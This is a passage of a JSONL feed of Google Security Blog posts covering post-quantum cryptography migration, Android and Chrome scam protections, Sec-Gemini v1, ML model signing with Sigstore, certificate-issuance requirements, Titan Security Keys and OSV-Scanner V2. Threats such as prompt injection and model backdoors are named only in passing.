future large-scale quantum computers. However, this new result does underscore the importance of migrating to these standards in line with NIST recommended timelines.\nEstimated resources for factoring have been steadily decreasing\nQuantum computers break RSA by factoring numbers, using Shor’s algorithm. Since Peter Shor published this algorithm in 1994, the estimated number of qubits needed to run it has steadily decreased. For example, in 2012, it was estimated that a 2048-bit RSA key could be broken by a quantum computer with a billion physical qubits. In 2019, using the same physical assumptions – which consider qubits with a slightly lower error rate than Google Quantum AI’s current quantum computers – the estimate was lowered to 20 million physical qubits.\nHistorical estimates of the number of physical qubits needed to factor 2048-bit RSA integers.\nThis result represents a 20-fold decrease compared to our estimate from 2019\nThe reduction in physical qubit count comes from two sources: better algorithms and better error correction – whereby qubits used by the algorithm (\"logical qubits\") are redundantly encoded across many physical qubits, so that errors can be detected and corrected.\nOn the algorithmic side, the key change is to compute an approximate modular exponentiation rather than an exact one. An algorithm for doing this, while using only small work registers, was discovered in 2024 by Chevignard and Fouque and Schrottenloher. Their algorithm used 1000x more operations than prior work, but we found ways to reduce that overhead down to 2x.\nOn the error correction side, the key change is tripling the storage density of idle logical qubits by adding a second layer of error correction. Normally more error correction layers means more overhead, but a good combination was discovered by the Google Quantum AI team in 2023. Another notable error correction improvement is using \"magic state cultivation\", proposed by the Google Quantum AI team in 2024, to reduce the workspace required for certain basic quantum operations. These error correction improvements aren't specific to factoring and also reduce the required resources for other quantum computations like in chemistry and materials simulation.\nSecurity implications\nNIST recently concluded a PQC competition that resulted in the first set of PQC standards. These algorithms can already be deployed to defend against quantum computers well before a working cryptographically relevant quantum computer is built.\nTo assess the security implications of quantum computers, however, it’s instructive to additionally take a closer look at the affected algorithms (see here for a detailed look): RSA and Elliptic Curve Diffie-Hellman. As asymmetric algorithms, they are used for encryption in transit, including encryption for messaging services, as well as digital signatures (widely used to prove the authenticity of documents or software, e.g. the identity of websites). For asymmetric encryption, in particular encryption in transit, the motivation to migrate to PQC is made more urgent due to the fact that an adversary can collect ciphertexts, and later decrypt them once a quantum computer is available, known as a “store now, decrypt later” attack. Google has therefore been encrypting traffic both in Chrome and internally, switching to the standardized version of ML-KEM once it became available. Notably not affected is symmetric cryptography, which is primarily deployed in encryption at rest, and to enable some stateless services.\nFor signatures, things are more complex. Some signature use cases are similarly urgent, e.g., when public keys are fixed in hardware. In general, the landscape for signatures is mostly remarkable due to the higher complexity of the transition, since signature keys are used in many different places, and since these keys tend to be longer lived than the usually ephemeral encryption keys. Signature keys are therefore harder to replace and much more attractive targets to attack, especially when compute time on a quantum computer is a limited resource. This complexity likewise motivates moving earlier rather than later. To enable this, we have added PQC signature schemes in public preview in Cloud KMS.\nThe initial public draft of the NIST internal report on the transition to post-quantum cryptography standards states that vulnerable systems should be deprecated after 2030 and disallowed after 2035. Our work highlights the importance of adhering to this recommended timeline.\nMore from Google on PQC: https://cloud.google.com/security/resources/post-quantum-cryptography?e=48754805\nPost a Comment", "timestamp": "2025-10-21T13:33:55.024106"}
{"source": "blog", "feed": "https://security.googleblog.com/feeds/posts/default", "title": "What’s New in Android Security and Privacy in 2025", "url": "http://security.googleblog.com/2025/05/whats-new-in-android-security-privacy-2025.html", "published": "2025-05-13T12:59:00.019-04:00", "content": "Android’s intelligent protections keep you safe from everyday dangers. Our dedication to your security is validated by security experts, who consistently rank top Android devices highest in security, and score Android smartphones, led by the Pixel 9 Pro, as leaders in anti-fraud efficacy.Android is always developing new protections to keep you, your device, and your data safe. Today, we’re announcing new features and enhancements that build on our industry-leading protections to help keep you safe from scams, fraud, and theft on Android.\nOur research shows that phone scammers often try to trick people into performing specific actions to initiate a scam, like changing default device security settings or granting elevated permissions to an app. These actions can result in spying, fraud, and other abuse by giving an attacker deeper access to your device and data. To combat phone scammers, we’re working to block specific actions and warn you of these sophisticated attempts. This happens completely on device and is applied only with conversations with non-contacts.\nAndroid’s new in-call protections1 provide an additional layer of defense, preventing you from taking risky security actions during a call like:\nAnd if you’re screen sharing during a phone call, Android will now automatically prompt you to stop sharing at the end of a call. These protections help safeguard you against scammers that attempt to gain access to sensitive information to conduct fraud.\nWhen you launch a participating banking app while screen sharing with an unknown contact, your Android device will warn you about the potential dangers and give you the option to end the call and to stop screen sharing with one tap.\nThis feature will be enabled automatically for participating banking apps whenever you're on a phone call with an unknown contact on Android 11+ devices. We are working with UK banks Monzo, NatWest and Revolut to pilot this feature for their customers in the coming weeks and will assess the results of the pilot ahead of a wider roll out.\nWe recently launched AI-powered Scam Detection in Google Messages and Phone by Google to protect you from conversational scams that might sound innocent at first, but turn malicious and can lead to financial loss or data theft. When Scam Detection discovers a suspicious conversation pattern, it warns you in real-time so you can react before falling victim to a costly scam. AI-powered Scam Detection is always improving to help keep you safe while also keeping your privacy in mind. With Google’s advanced on-device AI, your conversations stay private to you. All message processing remains on-device and you’re always in control. You can turn off Spam Protection, which includes Scam Detection, in your Google Messages at any time.\nPrior to targeting conversational scams, Scam Detection in Google Messages focused on analyzing and detecting package delivery and job seeking scams. We’ve now expanded our detections to help protect you from a wider variety of sophisticated scams including:\nTo help protect you from scammers who try to impersonate someone you know, we’re launching a helpful tool called Key Verifier. The feature allows you and the person you’re messaging to verify the identity of the other party through public encryption keys, protecting your end-to-end encrypted messages in Google Messages. By verifying contact keys in your Google Contacts app (through a QR code scanning or number comparison), you can have an extra layer of assurance that the person on the other end is genuine and that your conversation is private with them.\nKey Verifier provides a visual way for you and your contact to quickly confirm that your secret keys match, strengthening your confidence that you’re communicating with the intended recipient and not a scammer. For example, if an attacker gains access to a friend’s phone number and uses it on another device to send you a message – which can happen as a result of a SIM swap attack – their contact's verification status will be marked as no longer verified in the Google Contacts app, suggesting your friend’s account may be compromised or has been changed. Key Verifier will launch later this summer in Google Messages on Android 10+ devices.\nPhysical device theft can lead to financial fraud and data theft, with the value of your banking and payment information many times exceeding the value of your phone. This is one of the reasons why last year we launched the mobile industry’s most comprehensive suite of theft protection features to protect you before, during, and after a theft. Since launch, our theft protection features have helped protect data on hundreds of thousands of devices that may have fallen into the wrong hands. This includes devices that were locked by Remote Lock or Theft Detection Lock and remained locked for over 48 hours.\nMost recently, we launched Identity Check for Pixel and Samsung One UI 7 devices, providing an extra layer of security even if your PIN or password is compromised. This protection will also now be available from more device manufacturers on supported devices that upgrade to Android 16.\nComing later this year, we’re further hardening Factory Reset protections, which will restrict all functionalities on devices that are reset without the owner’s authorization. You'll also gain more control over our Remote Lock feature with the addition of a security challenge question, helping to prevent unauthorized actions.\nWe’re also enhancing your security against thieves in Android 16 by providing more protection for one-time passwords that are received when your phone is locked. In higher risk scenarios2, Android will hide one-time passwords on your lock screen, ensuring that only you can see them after unlocking your device.\nProtecting users who need heightened security has been a long-standing commitment at Google, which is why we have our Advanced Protection Program that provides Google’s strongest protections against targeted attacks.To enhance these existing device defenses, Android 16 extends Advanced Protection with a device-level security setting for Android users. Whether you’re an at-risk individual – such as a journalist, elected official, or public figure – or you just prioritize security, Advanced Protection gives you the ability to activate Google’s strongest security for mobile devices, providing greater peace of mind that you’re protected against the most sophisticated threats.\nAdvanced Protection is available on devices with Android 16. Learn more in our blog.\nOne way malicious developers try to trick people is by hiding or changing their app icon, making unsafe apps more difficult to find and remove. Now, Google Play Protect live threat detection will catch apps and alert you when we detect this deceptive behavior. This feature will be available to Google Pixel 6+ and a selection of new devices from other manufacturers in the coming months.\nGoogle Play Protect always checks each app before it gets installed on your device, regardless of the install source. It conducts real-time scanning of an app, enhanced by on-device machine learning, when users try to install an app that has never been seen by Google Play Protect to help detect emerging threats.\nWe’ve made Google Play Protect’s on-device capabilities smarter to help us identify more malicious applications even faster to keep you safe. Google Play Protect now uses a new set of on-device rules to specifically look for text or binary patterns to quickly identify malware families. If an app shows these malicious patterns, we can alert you before you even install it. And to keep you safe from new and emerging malware and their variants, we will update these rules frequently for better classification over time.\nThis update to Google Play Protect is now available globally for all Android users with Google Play services.\nIn addition to new features that come in numbered Android releases, we're constantly enhancing your protection on Android through seamless Google Play services updates and other improvements, ensuring you benefit from the latest security advancements continuously. This allows us to rapidly deploy critical defenses and keep you ahead of emerging threats, making your Android experience safer every day.Through close collaboration with our partners across the Android ecosystem and the broader security community, we remain focused on bringing you security enhancements and innovative new features to help keep you safe.\nIn-call protection for disabling Google Play Protect is available on Android 6+ devices. Protections for sideloading an app and turning on accessibility permissions are available on Android 16 devices. ↩\nWhen a user’s device is not connected to Wi-Fi and has not been recently unlocked ↩\nPost a Comment", "timestamp": "2025-10-21T13:33:55.818381"}
{"source": "blog", "feed": "https://security.googleblog.com/feeds/posts/default", "title": "Advanced Protection: Google’s Strongest Security for Mobile Devices", "url": "http://security.googleblog.com/2025/05/advanced-protection-mobile-devices.html", "published": "2025-05-13T12:59:00.017-04:00", "content": "Protecting users who need heightened security has been a long-standing commitment at Google, which is why we have our Advanced Protection Program that provides Google’s strongest protections against targeted attacks.To enhance these existing device defenses, Android 16 extends Advanced Protection with a device-level security setting for Android users. Whether you’re an at-risk individual – such as a journalist, elected official, or public figure – or you just prioritize security, Advanced Protection gives you the ability to activate Google’s strongest security for mobile devices, providing greater peace of mind that you’re protected against the most sophisticated threats.\nAdvanced Protection ensures all of Android's highest security features are enabled and are seamlessly working together to safeguard you against online attacks, harmful apps, and data risks. Advanced Protection activates a powerful array of security features, combining new capabilities with pre-existing ones that have earned top ratings in security comparisons, all designed to protect your device across several critical areas.We're also introducing innovative, Android-specific features, such as Intrusion Logging. This industry-first feature securely backs up device logs in a privacy-preserving and tamper-resistant way, accessible only to the user. These logs enable a forensic analysis if a device compromise is ever suspected.\nAdvanced Protection gives users:\nAdvanced Protection manages the following existing and new security features for your device, ensuring they are activated and cannot be disabled across critical protection areas:\nWith the release of Android 16, users who choose to activate Advanced Protection will gain immediate access to a core suite of enhanced security features. Additional Advanced Protection features like Intrusion Logging, USB protection, the option to disable auto-reconnect to insecure networks, and integration with Scam Detection for Phone by Google will become available later this year.\nWe are committed to continuously expanding the security and privacy capabilities within Advanced Protection, so users can benefit from the best of Android’s powerful security features.\nPost a Comment", "timestamp": "2025-10-21T13:33:56.599000"}
{"source": "blog", "feed": "https://security.googleblog.com/feeds/posts/default", "title": "Using AI to stop tech support scams in Chrome", "url": "http://security.googleblog.com/2025/05/using-ai-to-stop-tech-support-scams-in.html", "published": "2025-05-08T12:59:00.001-04:00", "content": "Tech support scams are an increasingly prevalent form of cybercrime, characterized by deceptive tactics aimed at extorting money or gaining unauthorized access to sensitive data. In a tech support scam, the goal of the scammer is to trick you into believing your computer has a serious problem, such as a virus or malware infection, and then convince you to pay for unnecessary services, software, or grant them remote access to your device. Tech support scams on the web often employ alarming pop-up warnings mimicking legitimate security alerts. We've also observed them to use full-screen takeovers and disable keyboard and mouse input to create a sense of crisis.\nChrome has always worked with Google Safe Browsing to help keep you safe online. Now, with this week's launch of Chrome 137, Chrome will offer an additional layer of protection using the on-device Gemini Nano large language model (LLM). This new feature will leverage the LLM to generate signals that will be used by Safe Browsing in order to deliver higher confidence verdicts about potentially dangerous sites like tech support scams.\nInitial research using LLMs has shown that they are relatively effective at understanding and classifying the varied, complex nature of websites. As such, we believe we can leverage LLMs to help detect scams at scale and adapt to new tactics more quickly. But why on-device? Leveraging LLMs on-device allows us to see threats when users see them. We’ve found that the average malicious site exists for less than 10 minutes, so on-device protection allows us to detect and block attacks that haven't been crawled before. The on-device approach also empowers us to see threats the way users see them. Sites can render themselves differently for different users, often for legitimate purposes (e.g. to account for device differences, offer personalization, provide time-sensitive content), but sometimes for illegitimate purposes (e.g. to evade security crawlers) – as such, having visibility into how sites are presenting themselves to real users enhances our ability to assess the web.\nHow it works\nAt a high level, here's how this new layer of protection works.\nOverview of how on-device LLM assistance in mitigating scams works\nWhen a user navigates to a potentially dangerous page, specific triggers that are characteristic of tech support scams (for example, the use of the keyboard lock API) will cause Chrome to evaluate the page using the on-device Gemini Nano LLM. Chrome provides the LLM with the contents of the page that the user is on and queries it to extract security signals, such as the intent of the page. This information is then sent to Safe Browsing for a final verdict. If Safe Browsing determines that the page is likely to be a scam based on the LLM output it receives from the client, in addition to other intelligence and metadata about the site, Chrome will show a warning interstitial.\nThis is all done in a way that preserves performance and privacy. In addition to ensuring that the LLM is only triggered sparingly and run locally on the device, we carefully manage resource consumption by considering the number of tokens used, running the process asynchronously to avoid interrupting browser activity, and implementing throttling and quota enforcement mechanisms to limit GPU usage. LLM-summarized security signals are only sent to Safe Browsing for users who have opted-in to the Enhanced Protection mode of Safe Browsing in Chrome, giving them protection against threats Google may not have seen before. Standard Protection users will also benefit indirectly from this feature as we add newly discovered dangerous sites to blocklists.\nFuture considerations\nThe scam landscape continues to evolve, with bad actors constantly adapting their tactics. Beyond tech support scams, in the future we plan to use the capabilities described in this post to help detect other popular scam types, such as package tracking scams and unpaid toll scams. We also plan to utilize the growing power of Gemini to extract additional signals from website content, which will further enhance our detection capabilities. To protect even more users from scams, we are working on rolling out this feature to Chrome on Android later this year. And finally, we are collaborating with our research counterparts to explore solutions to potential exploits such as prompt injection in content and timing bypass.\nPost a Comment", "timestamp": "2025-10-21T13:33:57.353062"}
{"source": "blog", "feed": "https://security.googleblog.com/feeds/posts/default", "title": "Google announces Sec-Gemini v1, a new experimental cybersecurity model", "url": "http://security.googleblog.com/2025/04/google-launches-sec-gemini-v1-new.html", "published": "2025-04-04T14:53:00.028-04:00", "content": "Today, we’re announcing Sec-Gemini v1, a new experimental AI model focused on advancing cybersecurity AI frontiers.\nAs outlined a year ago, defenders face the daunting task of securing against all cyber threats, while attackers need to successfully find and exploit only a single vulnerability. This fundamental asymmetry has made securing systems extremely difficult, time consuming and error prone. AI-powered cybersecurity workflows have the potential to help shift the balance back to the defenders by force multiplying cybersecurity professionals like never before.\nEffectively powering SecOps workflows requires state-of-the-art reasoning capabilities and extensive current cybersecurity knowledge. Sec-Gemini v1 achieves this by combining Gemini’s advanced capabilities with near real-time cybersecurity knowledge and tooling. This combination allows it to achieve superior performance on key cybersecurity workflows, including incident root cause analysis, threat analysis, and vulnerability impact understanding.\nWe firmly believe that successfully pushing AI cybersecurity frontiers to decisively tilt the balance in favor of the defenders requires a strong collaboration across the cybersecurity community. This is why we are making Sec-Gemini v1 freely available to select organizations, institutions, professionals, and NGOs for research purposes.\nSec-Gemini v1 outperforms other models on key cybersecurity benchmarks as a result of its advanced integration of Google Threat Intelligence (GTI), OSV, and other key data sources. Sec-Gemini v1 outperforms other models on CTI-MCQ, a leading threat intelligence benchmark, by at least 11% (See Figure 1). It also outperforms other models by at least 10.5% on the CTI-Root Cause Mapping benchmark (See Figure 2):\nFigure 1: Sec-Gemini v1 outperforms other models on the CTI-MCQ Cybersecurity Threat Intelligence benchmark.\nFigure 2: Sec-Gemini v1 has outperformed other models in a Cybersecurity Threat Intelligence-Root Cause Mapping (CTI-RCM) benchmark that evaluates an LLM's ability to understand the nuances of vulnerability descriptions, identify vulnerabilities underlying root causes, and accurately classify them according to the CWE taxonomy.\nBelow is an example of the comprehensiveness of Sec-Gemini v1’s answers in response to key cybersecurity questions. First, Sec-Gemini v1 is able to determine that Salt Typhoon is a threat actor (not all models do) and provides a comprehensive description of that threat actor, thanks to its deep integration with Mandiant Threat intelligence data.\nNext, in response to a question about the vulnerabilities in the Salt Typhoon description, Sec-Gemini v1 outputs not only vulnerability details (thanks to its integration with OSV data, the open-source vulnerabilities database operated by Google), but also contextualizes the vulnerabilities with respect to threat actors (using Mandiant data). With Sec-Gemini v1, analysts can understand the risk and threat profile associated with specific vulnerabilities faster.\nPost a Comment", "timestamp": "2025-10-21T13:33:58.012593"}
{"source": "blog", "feed": "https://security.googleblog.com/feeds/posts/default", "title": "Taming the Wild West of ML: Practical Model Signing with Sigstore", "url": "http://security.googleblog.com/2025/04/taming-wild-west-of-ml-practical-model.html", "published": "2025-04-04T13:00:00.000-04:00", "content": "In partnership with NVIDIA and HiddenLayer, as part of the Open Source Security Foundation, we are now launching the first stable version of our model signing library. Using digital signatures like those from Sigstore, we allow users to verify that the model used by the application is exactly the model that was created by the developers. In this blog post we will illustrate why this release is important from Google’s point of view.\nWith the advent of LLMs, the ML field has entered an era of rapid evolution. We have seen remarkable progress leading to weekly launches of various applications which incorporate ML models to perform tasks ranging from customer support, software development, and even performing security critical tasks.\nHowever, this has also opened the door to a new wave of security threats. Model and data poisoning, prompt injection, prompt leaking and prompt evasion are just a few of the risks that have recently been in the news. Garnering less attention are the risks around the ML supply chain process: since models are an uninspectable collection of weights (sometimes also with arbitrary code), an attacker can tamper with them and achieve significant impact to those using the models. Users, developers, and practitioners need to examine an important question during their risk assessment process: “can I trust this model?”\nSince its launch, Google’s Secure AI Framework (SAIF) has created guidance and technical solutions for creating AI applications that users can trust. A first step in achieving trust in the model is to permit users to verify its integrity and provenance, to prevent tampering across all processes from training to usage, via cryptographic signing.\nTo understand the need for the model signing project, let’s look at the way ML powered applications are developed, with an eye to where malicious tampering can occur.\nApplications that use advanced AI models are typically developed in at least three different stages. First, a large foundation model is trained on large datasets. Next, a separate ML team finetunes the model to make it achieve good performance on application specific tasks. Finally, this fine-tuned model is embedded into an application.\nThe three steps involved in building an application that uses large language models.\nThese three stages are usually handled by different teams, and potentially even different companies, since each stage requires specialized expertise. To make models available from one stage to the next, practitioners leverage model hubs, which are repositories for storing models. Kaggle and HuggingFace are popular open source options, although internal model hubs could also be used.\nThis separation into stages creates multiple opportunities where a malicious user (or external threat actor who has compromised the internal infrastructure) could tamper with the model. This could range from just a slight alteration of the model weights that control model behavior, to injecting architectural backdoors — completely new model behaviors and capabilities that could be triggered only on specific inputs. It is also possible to exploit the serialization format and inject arbitrary code execution in the model as saved on disk — our whitepaper on AI supply chain integrity goes into more details on how popular model serialization libraries could be exploited. The following diagram summarizes the risks across the ML supply chain for developing a single model, as discussed in the whitepaper.\nThe supply chain diagram for building a single model, illustrating some supply chain risks (oval labels) and where model signing can defend against them (check marks)\nThe diagram shows several places where the model could be compromised. Most of these could be prevented by signing the model during training and verifying integrity before any usage, in every step: the signature would have to be verified when the model gets uploaded to a model hub, when the model gets selected to be deployed into an application (embedded or via remote APIs) and when the model is used as an intermediary during another training run. Assuming the training infrastructure is trustworthy and not compromised, this approach guarantees that each model user can trust the model.\nSigning models is inspired by code signing, a critical step in traditional software development. A signed binary artifact helps users identify its producer and prevents tampering after publication. The average developer, however, would not want to manage keys and rotate them on compromise.\nThese challenges are addressed by using Sigstore, a collection of tools and services that make code signing secure and easy. By binding an OpenID Connect token to a workload or developer identity, Sigstore alleviates the need to manage or rotate long-lived secrets. Furthermore, signing is made transparent so signatures over malicious artifacts could be audited in a public transparency log, by anyone. This ensures that split-view attacks are not possible, so any user would get the exact same model. These features are why we recommend Sigstore’s signing mechanism as the default approach for signing ML models.\nToday the OSS community is releasing the v1.0 stable version of our model signing library as a Python package supporting Sigstore and traditional signing methods. This model signing library is specialized to handle the sheer scale of ML models (which are usually much larger than traditional software components), and handles signing models represented as a directory tree. The package provides CLI utilities so that users can sign and verify model signatures for individual models. The package can also be used as a library which we plan to incorporate directly into model hub upload flows as well as into ML frameworks.\nWe can view model signing as establishing the foundation of trust in the ML ecosystem. We envision extending this approach to also include datasets and other ML-related artifacts. Then, we plan to build on top of signatures, towards fully tamper-proof metadata records, that can be read by both humans and machines. This has the potential to automate a significant fraction of the work needed to perform incident response in case of a compromise in the ML world. In an ideal world, an ML developer would not need to perform any code changes to the training code, while the framework itself would handle model signing and verification in a transparent manner.\nPost a Comment", "timestamp": "2025-10-21T13:33:58.704606"}
{"source": "blog", "feed": "https://security.googleblog.com/feeds/posts/default", "title": "New security requirements adopted by HTTPS certificate industry", "url": "http://security.googleblog.com/2025/03/new-security-requirements-adopted-by.html", "published": "2025-03-27T16:49:00.000-04:00", "content": "The Chrome Root Program launched in 2022 as part of Google’s ongoing commitment to upholding secure and reliable network connections in Chrome. We previously described how the Chrome Root Program keeps users safe, and described how the program is focused on promoting technologies and practices that strengthen the underlying security assurances provided by Transport Layer Security (TLS). Many of these initiatives are described on our forward looking, public roadmap named “Moving Forward, Together.”\nAt a high-level, “Moving Forward, Together” is our vision of the future. It is non-normative and considered distinct from the requirements detailed in the Chrome Root Program Policy. It’s focused on themes that we feel are essential to further improving the Web PKI ecosystem going forward, complementing Chrome’s core principles of speed, security, stability, and simplicity. These themes include:\nEarlier this month, two “Moving Forward, Together” initiatives became required practices in the CA/Browser Forum Baseline Requirements (BRs). The CA/Browser Forum is a cross-industry group that works together to develop minimum requirements for TLS certificates. Ultimately, these new initiatives represent an improvement to the security and agility of every TLS connection relied upon by Chrome users.\nIf you’re unfamiliar with HTTPS and certificates, see the “Introduction” of this blog post for a high-level overview.\nMulti-Perspective Issuance Corroboration\nBefore issuing a certificate to a website, a Certification Authority (CA) must verify the requestor legitimately controls the domain whose name will be represented in the certificate. This process is referred to as \"domain control validation\" and there are several well-defined methods that can be used. For example, a CA can specify a random value to be placed on a website, and then perform a check to verify the value’s presence has been published by the certificate requestor.\nDespite the existing domain control validation requirements defined by the CA/Browser Forum, peer-reviewed research authored by the Center for Information Technology Policy (CITP) of Princeton University and others highlighted the risk of Border Gateway Protocol (BGP) attacks and prefix-hijacking resulting in fraudulently issued certificates. This risk was not merely theoretical, as it was demonstrated that attackers successfully exploited this vulnerability on numerous occasions, with just one of these attacks resulting in approximately $2 million dollars of direct losses.\nMulti-Perspective Issuance Corroboration (referred to as \"MPIC\") enhances existing domain control validation methods by reducing the likelihood that routing attacks can result in fraudulently issued certificates. Rather than performing domain control validation and authorization from a single geographic or routing vantage point, which an adversary could influence as demonstrated by security researchers, MPIC implementations perform the same validation from multiple geographic locations and/or Internet Service Providers. This has been observed as an effective countermeasure against ethically conducted, real-world BGP hijacks.\nThe Chrome Root Program led a work team of ecosystem participants, which culminated in a CA/Browser Forum Ballot to require adoption of MPIC via Ballot SC-067. The ballot received unanimous support from organizations who participated in voting. Beginning March 15, 2025, CAs issuing publicly-trusted certificates must now rely on MPIC as part of their certificate issuance process. Some of these CAs are relying on the Open MPIC Project to ensure their implementations are robust and consistent with ecosystem expectations.\nWe’d especially like to thank Henry Birge-Lee, Grace Cimaszewski, Liang Wang, Cyrill Krähenbühl, Mihir Kshirsagar, Prateek Mittal, Jennifer Rexford, and others from Princeton University for their sustained efforts in promoting meaningful web security improvements and ongoing partnership.\nLinting\nLinting refers to the automated process of analyzing X.509 certificates to detect and prevent errors, inconsistencies, and non-compliance with requirements and industry standards. Linting ensures certificates are well-formatted and include the necessary data for their intended use, such as website authentication.\nLinting can expose the use of weak or obsolete cryptographic algorithms and other known insecure practices, improving overall security. Linting improves interoperability and helps CAs reduce the risk of non-compliance with industry standards (e.g., CA/Browser Forum TLS Baseline Requirements). Non-compliance can result in certificates being \"mis-issued\". Detecting these issues before a certificate is in use by a site operator reduces the negative impact associated with having to correct a mis-issued certificate.\nThere are numerous open-source linting projects in existence (e.g., certlint, pkilint, x509lint, and zlint), in addition to numerous custom linting projects maintained by members of the Web PKI ecosystem. “Meta” linters, like pkimetal, combine multiple linting tools into a single solution, offering simplicity and significant performance improvements to implementers compared to implementing multiple standalone linting solutions.\nLast spring, the Chrome Root Program led ecosystem-wide experiments, emphasizing the need for linting adoption due to the discovery of widespread certificate mis-issuance. We later participated in drafting CA/Browser Forum Ballot SC-075 to require adoption of certificate linting. The ballot received unanimous support from organizations who participated in voting. Beginning March 15, 2025, CAs issuing publicly-trusted certificates must now rely on linting as part of their certificate issuance process.\nWhat’s next?\nWe recently landed an updated version of the Chrome Root Program Policy that further aligns with the goals outlined in “Moving Forward, Together.” The Chrome Root Program remains committed to proactive advancement of the Web PKI. This commitment was recently realized in practice through our proposal to sunset demonstrated weak domain control validation methods permitted by the CA/Browser Forum TLS Baseline Requirements. The weak validation methods in question are now prohibited beginning July 15, 2025.\nIt’s essential we all work together to continually improve the Web PKI, and reduce the opportunities for risk and abuse before measurable harm can be realized. We continue to value collaboration with web security professionals and the members of the CA/Browser Forum to realize a safer Internet. Looking forward, we’re excited to explore a reimagined Web PKI and Chrome Root Program with even stronger security assurances for the web as we navigate the transition to post-quantum cryptography. We’ll have more to say about quantum-resistant PKI later this year.\nPost a Comment", "timestamp": "2025-10-21T13:33:59.393614"}
{"source": "blog", "feed": "https://security.googleblog.com/feeds/posts/default", "title": "Titan Security Keys now available in more countries", "url": "http://security.googleblog.com/2025/03/titan-security-keys-now-available-in.html", "published": "2025-03-26T13:00:00.000-04:00", "content": "We’re excited to announce that starting today, Titan Security Keys are available for purchase in more than 10 new countries:\nIreland\nPortugal\nThe Netherlands\nDenmark\nNorway\nSweden\nFinland\nAustralia\nNew Zealand\nSingapore\nPuerto Rico\nThis expansion means Titan Security Keys are now available in 22 markets, including previously announced countries like Austria, Belgium, Canada, France, Germany, Italy, Japan, Spain, Switzerland, the UK, and the US.\nWhat is a Titan Security Key?\nA Titan Security Key is a small, physical device that you can use to verify your identity when you sign in to your Google Account. It’s like a second password that’s much harder for cybercriminals to steal.\nTitan Security Keys allow you to store your passkeys on a strong, purpose-built device that can help protect you against phishing and other online attacks. They’re easy to use and work with a wide range of devices and services as they’re compatible with the FIDO2 standard.\nHow do I use a Titan Security Key?\nTo use a Titan Security Key, you simply plug it into your computer’s USB port or tap it to your device using NFC. When you’re asked to verify your identity, you’ll just need to tap the button on the key.\nWhere can I buy a Titan Security Key?\nYou can buy Titan Security Keys on the Google Store.\nWe’re committed to making our products available to as many people as possible and we hope this expansion will help more people stay safe online.\nPost a Comment", "timestamp": "2025-10-21T13:34:00.080975"}
{"source": "blog", "feed": "https://security.googleblog.com/feeds/posts/default", "title": "Announcing OSV-Scanner V2: Vulnerability scanner and remediation tool for open source", "url": "http://security.googleblog.com/2025/03/announcing-osv-scanner-v2-vulnerability.html", "published": "2025-03-17T12:46:00.006-04:00", "content": "In December 2022, we released the open source OSV-Scanner tool, and earlier this year, we open sourced OSV-SCALIBR. OSV-Scanner and OSV-SCALIBR, together with OSV.dev are components of an open platform for managing vulnerability metadata and enabling simple and accurate matching and remediation of known vulnerabilities. Our goal is to simplify and streamline vulnerability management for developers and security teams alike.\nToday, we're thrilled to announce the launch of OSV-Scanner V2.0.0, following the announcement of the beta version. This V2 release builds upon the foundation we laid with OSV-SCALIBR and adds significant new capabilities to OSV-Scanner, making it a comprehensive vulnerability scanner and remediation tool with broad support for formats and ecosystems.\nThis release represents the first major integration of OSV-SCALIBR features into OSV-Scanner, which is now the official command-line code and container scanning tool for the OSV-SCALIBR library. This integration also expanded our support for the kinds of dependencies we can extract from projects and containers:\nSource manifests and lockfiles:\n.NET: deps.json\nPython: uv.lock\nJavaScript: bun.lock\nHaskell: cabal.project.freeze, stack.yaml.lock\nArtifacts:\nNode modules\nPython wheels\nJava uber jars\nGo binaries\nPreviously, OSV-Scanner focused on scanning of source repositories and language package manifests and lockfiles. OSV-Scanner V2 adds support for comprehensive, layer-aware scanning for Debian, Ubuntu, and Alpine container images. OSV-Scanner can now analyze container images to provide:\nLayers where a package was first introduced\nLayer history and commands\nBase images the image is based on (leveraging a new experimental API provided by deps.dev).\nOS/Distro the container is running on\nFiltering of vulnerabilities that are unlikely to impact your container image\nThis layer analysis currently supports the following OSes and languages:\nDistro Support:\nAlpine OS\nDebian\nUbuntu\nLanguage Artifacts Support:\nGo\nJava\nNode\nPython\nPresenting vulnerability scan information in a clear and actionable way is difficult, particularly in the context of container scanning. To address this, we built a new interactive local HTML output format. This provides more interactivity and information compared to terminal only outputs, including:\nSeverity breakdown\nPackage and ID filtering\nVulnerability importance filtering\nFull vulnerability advisory entries\nAnd additionally for container image scanning:\nLayer filtering\nImage layer information\nBase image identification\nIllustration of HTML output for container image scanning\nLast year we released a feature called guided remediation for npm, which streamlines vulnerability management by intelligently suggesting prioritized, targeted upgrades and offering flexible strategies. This ultimately maximizes security improvements while minimizing disruption. We have now expanded this feature to Java through support for Maven pom.xml.\nWith guided remediation support for Maven, you can remediate vulnerabilities in both direct and transitive dependencies through direct version updates or overriding versions through dependency management.\nWe’ve introduced a few new things for our Maven support:\nA new remediation strategy override.\nSupport for reading and writing pom.xml files, including writing changes to local parent pom files. We leverage OSV-Scalibr for Maven transitive dependency extraction.\nA private registry can be specified to fetch Maven metadata.\nA new experimental subcommend to update all your dependencies in pom.xml to the latest version.\nWe also introduced machine readable output for guided remediation that makes it easier to integrate guided remediation into your workflow.\nWe have exciting plans for the remainder of the year, including:\nContinued OSV-SCALIBR Convergence: We will continue to converge OSV-Scanner and OSV-SCALIBR to bring OSV-SCALIBR’s functionality to OSV-Scanner’s CLI interface.\nExpanded Ecosystem Support: We'll expand the number of ecosystems we support across all the features currently in OSV-Scanner, including more languages for guided remediation, OS advisories for container scanning, and more general lockfile support for source code scanning.\nFull Filesystem Accountability for Containers: Another goal of osv-scanner is to give you the ability to know and account for every single file on your container image, including sideloaded binaries downloaded from the internet.\nReachability Analysis: We're working on integrating reachability analysis to provide deeper insights into the potential impact of vulnerabilities.\nVEX Support: We're planning to add support for Vulnerability Exchange (VEX) to facilitate better communication and collaboration around vulnerability information.\nYou can try V2.0.0 and contribute to its ongoing development by checking out OSV-Scanner or the OSV-SCALIBR repository. We welcome your feedback and contributions as we continue to improve the platform and make vulnerability management easier for everyone.\nPost a Comment", "timestamp": "2025-10-21T13:34:00.773795"}
